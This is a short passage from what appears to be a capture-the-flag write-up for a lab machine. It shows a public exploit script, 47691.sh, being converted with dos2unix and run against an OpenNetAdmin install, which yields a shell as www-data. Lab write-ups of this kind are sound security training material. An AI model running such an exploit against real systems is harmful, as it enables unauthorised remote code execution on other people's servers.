There is actually an exploit for the exact version we have and with it we can achieve remote code execution. The script is in DOS mode so we have to quickly convert it so that it runs properly.
```bash
dos2unix [47691.sh](<http://47691.sh/>)
dos2unix: converting file [47691.sh](<http://47691.sh/>) to Unix format...
# ./47691.sh <http://openadmin.htb/ona/>
$ whoami
www-data
$ pwd
/opt/ona/www
```
